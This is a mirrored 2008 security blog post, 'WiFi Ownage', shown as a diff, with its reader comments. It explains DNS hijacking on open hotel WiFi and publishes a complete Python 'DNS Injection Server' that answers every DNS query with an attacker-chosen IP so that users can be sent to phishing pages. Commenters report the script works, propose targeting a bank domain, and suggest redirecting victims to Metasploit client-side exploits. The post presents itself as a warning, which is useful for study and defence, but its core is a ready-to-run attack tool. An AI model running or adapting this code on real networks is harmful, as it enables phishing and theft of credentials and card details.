@@ -1,0 +1,358 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr" lang="en-US">
+	
+<!-- Mirrored from www.gnucitizen.org/blog/wifi-ownage/ by HTTrack Website Copier/3.x [XR&CO'2010], Sat, 07 Jul 2012 14:54:32 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8"><!-- /Added by HTTrack -->
+<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+		<link rel="profile" href="http://gmpg.org/xfn/11"/>
+		<link rel="pingback" href="../../wordpress/xmlrpc.php" />
+		<link rel="alternate" type="application/rdf+xml" title="GNUCITIZEN" href="../../feed/rdf/index.html"/>
+		<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN" href="../../feed/rss/index.html"/>
+		<link rel="alternate" type="application/atom+xml" title="GNUCITIZEN" href="../../feed/atom/index.html"/>
+		<link rel="stylesheet" type="text/css" href="../../wordpress/wp-content/themes/gnucitizen.org-v2/style.css"/>
+		<title>GNUCITIZEN &raquo; WiFi Ownage</title>
+			<meta name="google-site-verification" content="yfE2zXU6xxSUp1CWarDop_6vVdGUUplpLF8P5Xe2fWM"/>
+	<link rel="icon" href="../../wordpress/wp-content/themes/gnucitizen.org-v2/styles/images/favicon.ico" type="image/x-icon"/>
+	<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN Comments" href="http://feedproxy.google.com/gnucitizenComments"/>
+	<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN Group" href="http://feedproxy.google.com/gnucitizenGroup"/>
+	<link rel="stylesheet" href="../../wordpress/wp-content/themes/gnucitizen.org-v2/scriptlets/slimbox2/slimbox2.css" type="text/css" media="screen"/>
+	<script src="../../wordpress/wp-content/themes/gnucitizen.org-v2/scripts/jquery.core.js" type="text/javascript"></script>
+	<script src="../../wordpress/wp-content/themes/gnucitizen.org-v2/scriptlets/slimbox2/slimbox2.js" type="text/javascript"></script>
+	<script src="../../wordpress/wp-content/themes/gnucitizen.org-v2/scripts/gnucitizen.common.js" type="text/javascript"></script>
+<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN &raquo; WiFi Ownage Comments Feed" href="feed/index.html" />
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="../../wordpress/xmlrpc0db0.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://www.gnucitizen.org/wordpress/wp-includes/wlwmanifest.xml" /> 
+<link rel='prev' title='JavaScript Global Namespace Pollution' href='../javascript-global-namespace-pollution/index.html' />
+<link rel='next' title='Total surveillance made easy with VoIP phones' href='../total-surveillance-made-easy-with-voip-phones/index.html' />
+<meta name="generator" content="WordPress 3.3.2" />
+<link rel='canonical' href='index.html' />
+<link rel='shortlink' href='../../index8fde.html?p=695' />
+<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN Network" href="http://feedproxy.google.com/gnucitizenNetwork"/>	</head>
+	
+	<body id="single" class="blog">
+		<div id="header">
+			<h1><a href="../../index.html"><span>GNUCITIZEN</span></a></h1>
+			<p><span>Information Security Think Tank</span></p>
+		</div>
+
+<div id="navigation">
+	<h2>Navigation</h2>
+	<ul>
+		<li class="cat-item cat-item-2"><a href="../../categories/blog/index.html" title="View all posts filed under Blog">Blog</a></li>
+		<li class="page_item page-item-266"><a href="../../archive/index.html">Archive</a></li>
+<li class="page_item page-item-236"><a href="../../about/index.html">About</a></li>
+<li class="page_item page-item-336"><a href="../../index.html">Home</a></li>
+			</ul>
+</div>
+
+<div id="content">
+			<div id="entry">
+							<div id="post-695" class="post">
+	<div class="post-title"><h2><span>WiFi Ownage</span></h2></div>
+	<div class="post-date"><span>published:</span> February 7th, 2008</div>
+	<div class="post-content"><div class="single-content-top-widgets"></div><p><em>This month GNUCITIZEN&#8217;s guest blogger is Sam Aldis, the founder of <a href="http://darkstar.me.uk/">darkstar.me.uk</a>. Sam started as a blackhat/script kiddie but soon he has learned a life lesson when he broke into a big football(soccer) leagues site. Sam did not serve any sentence but he had to pay a hefty fine. This is how he turned into a whitehat and now he is in the process of setting up his own security company. These are his words:</em></p>
+
+<p>I have recently been doing research into WiFi connections without wepkeys and where the attacker is able to change the primary DNS server on the router. This is actually a very serious problem as the attacker is able to get your credit card details or any other information you input without you even knowing.</p>
+
+<p>Imagine you are at a hotel with your laptop. You connect to the WiFi that they provide and type in <code>www.google.com</code>, which brings up google&#8217;s front page. The address bar says http://www.google.com and the page looks genuine so it is.. isn&#8217;t it? However, attackers may could have got access to the router and changed the primary DNS server through many of the available methods in the wild, like <a href="../hacking-with-upnp-universal-plug-and-play/index.html">UPnP hacking</a>, etc.</p>
+
+<p>Theoretically, the attacker could use any IP address to pull the trick, as long as a DNS server was running behind the UDP port 53. But it would be more beneficial if the attacker is under control of this DNS server, so he/she is able to show the user what ever they want them to see. For example, the user could type in their bank&#8217;s website address and end up at a phishing page but they wouldn&#8217;t know because they would see their banks address in the title bar and the page could be made to look exactly the same (and auto-update itself through some PHP magic). When the user logs in, a fake DNS server will respond which will make the user go to the wrong IP address. As you can see this is a big threat that will affect anyone who hasn&#8217;t secured their network.</p>
+
+<p>I have created a python script which can act as a temporary DNS server which will direct all requests to a certain IP (keep checking <a href="http://darkstar.me.uk/">http://darkstar.me.uk</a> for updates). Here is the script that complies to the scenarios described above:</p>
+
+<pre><code># DNS Injection Server
+# Created By fazed
+# DNSQuery class adapted from Francisco Santos's
+# code. why re-invent the wheel?
+
+from socket import *
+
+class DNSQuery:
+ def __init__(self, data):
+   self.data=data
+   self.domain=''
+
+   tipo = (ord(data[2]) &gt;&gt; 3) &#038; 15
+   if tipo == 0:
+     ini=12
+     lon=ord(data[ini])
+     while lon != 0:
+       self.domain+=data[ini+1:ini+lon+1]+'.'
+       ini+=lon+1
+       lon=ord(data[ini])
+
+ def respond(self, ip):
+   packet=''
+   if self.domain:
+     packet+=self.data[:2] + "\x81\x80"
+     packet+=self.data[4:6] + self.data[4:6] + '\x00\x00\x00\x00'
+     packet+=self.data[12:]
+     packet+='\xc0\x0c'
+     packet+='\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04'
+     packet+=str.join('',map(lambda x: chr(int(x)), ip.split('.')))
+   return packet
+
+print ":: DNS Injection Server Started ::"
+sh = socket(AF_INET, SOCK_DGRAM)
+print "Socket Handle Created.."
+sh.bind(('',53))
+print "Socket Handle Bound To UDP Port 53"
+ip = raw_input("IP to inject: ")
+try:
+   while 1:
+       data, addr = sh.recvfrom(1024)
+       print "DNS Request From:", addr[0]
+       p = DNSQuery(data)
+       print "Sending IP address:", ip
+       sh.sendto(p.respond(ip),addr)
+       print "Response Sent.."
+except KeyboardInterrupt:
+   print ":: DNS Injection Server Stoped ::"
+   sh.close()</code></pre>
+
+<p><em>The bottom line is: secure your networks and don&#8217;t trust public WiFi access points.</em></p><div class="single-content-bottom-widgets"></div></div>
+		<div class="post-links"><a href="index.html">more</a> | <a href="index.html#post-comments">comments</a> | <a href='feed/index.html'>comments rss</a> | posted by <a href="../../author/pdp/index.html" title="Posts by pdp" rel="author">pdp</a></div>
+	</div>
+				
+
+				<div id="post-comments">
+					<div class="comment byuser comment-author-pagvac even thread-even depth-1" id="comment-111284">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/0367b81839d31a5fa3d7bea79ef71b9e?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../application-layer-anti-virusfirewall/index.html' rel='external nofollow' class='url'>Adrian Pastor</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-111284">
+			February 7, 2008 at 2:30 pm</a>		</div>
+
+		<p>That&#8217;s a quite handy script, I will play around with it later on today!</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pagvac odd alt thread-odd thread-alt depth-1" id="comment-111289">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/0367b81839d31a5fa3d7bea79ef71b9e?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../application-layer-anti-virusfirewall/index.html' rel='external nofollow' class='url'>Adrian Pastor</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-111289">
+			February 7, 2008 at 2:42 pm</a>		</div>
+
+		<p>The script works like a charm, just tested it. The idea is that any domain names resolve to one IP address chosen by the attacker.</p>
+<p>It&#8217;d also be useful to write a variation of the tool that only makes certain domain names resolve to the evil IP address, and simply query a public DNS server for all other IPs. For instance, maybe the attacker is only interested in poisoning <a href="http://www.trustedbank.foo/" rel="nofollow">http://www.trustedbank.foo</a> and wants all other domain names to resolve to legitimate IP addresses.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-111335">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/50810029edcdaa02043eff094e4d37c6?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://sid.rstack.org/blog/' rel='external nofollow' class='url'>Sid</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-111335">
+			February 7, 2008 at 4:48 pm</a>		</div>
+
+		<p>I wrote 3 scripts in the same spirit aside of Wifitap that can be foudn in the same tarball:</p>
+<p>wifiping.py is just a PoC that answers ping requests on the fly<br />
+wifiarp.py that poisons ARP requests on the fly<br />
+wifidns.py that roughly does the same as yours</p>
+<p>Everything based on Scapy.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pagvac odd alt thread-odd thread-alt depth-1" id="comment-111479">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/0367b81839d31a5fa3d7bea79ef71b9e?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../application-layer-anti-virusfirewall/index.html' rel='external nofollow' class='url'>Adrian Pastor</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-111479">
+			February 7, 2008 at 10:14 pm</a>		</div>
+
+		<p>@Sid &#8211; sounds interesting!.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-111502">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/b4ea44fe1403213b6058de91c6856962?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">sqid</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-111502">
+			February 8, 2008 at 2:26 am</a>		</div>
+
+		<p>&#8220;Sam started as a blackhat/script kiddie but soon he has learned a life lesson when he broke into a big football(soccer) leagues site. Sam did not serve any sentence but he had to pay a hefty fine. This is how he turned into a whitehat&#8230;&#8221;</p>
+<p>You make it sounds like Gnucitizen is similar to Alcoholics Anonymous for blackhats. Also, by grouping blackhat and script-kiddie together, you make it sound like they are related to another, when, in fact, they are not. Could you give me some good reasoning on that?</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-111542">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/b670ac0a57f3b4dcdcba0791b2df128b?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Christopher Haney</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-111542">
+			February 8, 2008 at 4:28 am</a>		</div>
+
+		<p>Would this attack also work is you simply used (for example) a WRT54G with DD-WRT as a repeater and simply acted as a second access point to the WEP free AP?</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pdp bypostauthor even thread-even depth-1" id="comment-111607">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../about/pdp.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-111607">
+			February 8, 2008 at 8:29 am</a>		</div>
+
+		<p>sqid, it should have been blackhat script kiddie (no slash). And yes it makes a perfect sense. Blackhat can be used as a noun or adjective. Cheers.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-111612">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/50810029edcdaa02043eff094e4d37c6?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://sid.rstack.org/blog/' rel='external nofollow' class='url'>Sid</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-111612">
+			February 8, 2008 at 8:46 am</a>		</div>
+
+		<p>@Christopher: traffic injection attacks on WiFi work like a charm on WEP networks too, as long as you know the key. Not a big requirement after all ;)</p>
+<p>I could have Wifitap work on a WDS link as well, with an ugly hack I&#8217;m not really proud of.</p>
+<p>Getting back to the script, this attack is very like airpwn. This tool, demonstrated at Defcon 2004, catches HTTP requests for pictures and injects arbitrary replies. Very handy when you have&#8230; Let&#8217;s say&#8230; A JPEG or PNG buffer overflow  on browser :) You can also reply &#8220;GET /&#8221; requests with a 301 or 302 that will redirect browser anywhere you want, like a metasploit loaded with whatever client side exploit you may like.</p>
+<p>Check <a href="http://sid.rstack.org/pres/0608_BCS_OpenWireless.pdf" rel="nofollow">http://sid.rstack.org/pres/060.....reless.pdf</a> slides 33 to 47.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-112851">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/9bac8baa8ae20d56ec0320a2f2c33c82?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://darkstar.me.uk/' rel='external nofollow' class='url'>fazed</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-112851">
+			February 11, 2008 at 2:21 am</a>		</div>
+
+		<p>@squid:<br />
+what is meant is that I went through both being a script kiddie and as I learned more a blackhat.</p>
+<p>thanks for the comments everyone</p>
+<p>@Adrian:<br />
+I was thinking about creating a more complex script which can also redirect different entered urls to different IP&#8217;s/vHost&#8217;s and let any that are not listed in this &#8220;host&#8221; file go to the correct location but this script is just a PoC.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-113189">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/5d1658ac36692c8b5ff5612aa9d6a837?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">rezn</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-113189">
+			February 11, 2008 at 5:14 pm</a>		</div>
+
+		<p>This code may be helpful in further exploring malicious DNS server creation: </p>
+<p><a href="http://www.dnspython.org/" rel="nofollow">http://www.dnspython.org/</a></p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-126102">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/19d06429e8184c0f571af4f0339b64e4?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">lljkrieg</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-126102">
+			February 24, 2009 at 1:59 pm</a>		</div>
+
+		<p>DNS hijacking is certainly an interesting and potentially catastrophic issue for internet users but why reinvent the wheel to exploit the results?</p>
+<p>It is possible for an attacker controlled DNS server that supports wildcards, such as bind, to force all domains to resolve to the attacker&#8217;s web server. The web server can then proxy the real hostname and inject data into the stream, or load phishing pages for specific sites (sites which don&#8217;t allow proxies perhaps?), or launch malware, etc.</p>
+<p>This way user HTTP requests can easily be logged and a simple script on the web server could immediately change the payload without having to worry about DNS lease length.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-admin odd alt thread-odd thread-alt depth-1" id="comment-126136">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/02ad2ea464a98737d78746fa7b7c36b6?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://www.pdp.io/' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-126136">
+			February 25, 2009 at 11:10 am</a>		</div>
+
+		<p>you are right! I guess the intention was to write something that runs without too much configuration.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		</div>
+		
+		<div class="post-comments-navigation">
+			<div class="older-comments"></div>
+			<div class="newer-comments"></div>
+		</div>
+	
+	<div id="post-response">
+		<h2>Respond</h2>
+					<form action="http://www.gnucitizen.org/wordpress/wp-comments-post.php" name="response-form" method="post" class="response-form">
+				<p><em>We retain the right to remove any comment or trackback we determine to be, at our sole discretion, unacceptable.</em></p>
+									<div><label for="author">name: (required)</label></div>
+					<div><input type="text" name="author" id="author" value="" size="20" tabindex="1"/></div>
+					<div><label for="email">mail: (required)</label></div>
+					<div><input type="text" name="email" id="email" value="" size="20" tabindex="2"/></div>
+					<div><label for="url">website:</label></div>
+					<div><input type="text" name="url" id="url" value="" size="20" tabindex="3"/></div>
+								<div><label for="comment">comment:</label></div>
+				<div><textarea name="comment" id="comment" cols="50" rows="10" tabindex="4"></textarea></div>
+				<div>
+					<input class="button" name="submit" type="submit" id="submit" tabindex="5" value="submit"/>
+					<input class="button" name="reset" type="reset" id="reset" tabindex="6" value="reset"/>
+				</div>
+				<input type="hidden" name="comment_post_ID" value="695"/>
+				<p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="0af6bdf416" /></p>
+
+	<p style="clear: both;" class="subscribe-to-comments">
+	<input type="checkbox" name="subscribe" id="subscribe" value="subscribe" style="width: auto;" />
+	<label for="subscribe">Notify me of followup comments via e-mail</label>
+	</p>
+
+
+			</form>
+			</div>
+					</div>
+		<div id="content-sidebar">					<div class="widget">			<p style="font-size:24px"><em>Get <a href="http://www.websecurify.com/">Websecurify</a> - a cross-platform web security testing technology designed from the ground up with simplicity in mind.</em></p>			</div>			</div></div>
+
+				
+		<div id="footer">
+			
+	<script type="text/javascript">
+		var gaJsHost = (('https:' == document.location.protocol) ? 'https://ssl.' : 'http://www.');
+		document.write(unescape('%3Cscript src="' + gaJsHost + 'google-analytics.com/ga.js" type="text/javascript"%3E%3C/script%3E'));
+	</script>
+	<script type="text/javascript">
+		var pageTracker = _gat._getTracker('UA-363996-1');
+		pageTracker._initData();
+		pageTracker._trackPageview();
+	</script>
+
+				<p>(<a rel="license" href="http://creativecommons.org/licenses/by-nc-nd/2.5/" title="Creative Commons Attribution-Noncommercial-No Derivative Works 2.5 Generic">CC</a>)2005-2012 <a href="../../index.html" title="Information Security Think Tank">GNUCITIZEN</a></p>
+		</div>
+		
+		<!-- <rdf:RDF xmlns="http://web.resource.org/cc/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
+			<Work rdf:about="">
+				<license rdf:resource="http://creativecommons.org/licenses/by-nc-nd/2.5/"/>
+				<dc:title>GNUCITIZEN</dc:title>
+				<dc:date>2005-2012</dc:date>
+				<dc:creator><Agent><dc:title>GNUCITIZEN</dc:title></Agent></dc:creator>
+				<dc:rights><Agent><dc:title>GNUCITIZEN</dc:title></Agent></dc:rights>
+				<dc:type rdf:resource="http://purl.org/dc/dcmitype/Text"/>
+				<dc:source rdf:resource="http://www.gnucitizen.org"/>
+			</Work>
+			<License rdf:about="http://creativecommons.org/licenses/by-nc-nd/2.5/">
+				<permits rdf:resource="http://web.resource.org/cc/Reproduction"/>
+				<permits rdf:resource="http://web.resource.org/cc/Distribution"/>
+				<requires rdf:resource="http://web.resource.org/cc/Notice"/>
+				<requires rdf:resource="http://web.resource.org/cc/Attribution"/>
+				<prohibits rdf:resource="http://web.resource.org/cc/CommercialUse"/>
+			</License>
+		</rdf:RDF> -->
+		
+		<!-- tested by blogsecurify -->
+		<!-- wpscanner -->
+	</body>
+
+<!-- Mirrored from www.gnucitizen.org/blog/wifi-ownage/ by HTTrack Website Copier/3.x [XR&CO'2010], Sat, 07 Jul 2012 14:54:32 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8"><!-- /Added by HTTrack -->
+</html>
